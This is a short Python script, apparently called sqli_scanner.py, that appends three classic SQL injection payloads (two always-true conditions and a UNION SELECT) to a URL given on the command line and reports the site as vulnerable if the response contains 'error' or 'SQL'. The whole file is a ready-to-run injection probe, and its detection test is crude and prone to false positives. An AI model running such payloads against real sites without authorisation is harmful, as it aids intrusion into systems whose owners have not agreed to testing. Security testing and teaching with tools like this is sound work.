import requests
import sys

def scan_sqli(url):
    payloads = ["' OR '1'='1", "' OR 'a'='a", "' UNION SELECT null, null, null--"]
    for payload in payloads:
        response = requests.get(url + payload)
        if "error" in response.text or "SQL" in response.text:
            print(f"SQL Injection vulnerability found at: {url}")
            return
    print("No SQL Injection vulnerabilities found.")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python sqli_scanner.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    scan_sqli(url)
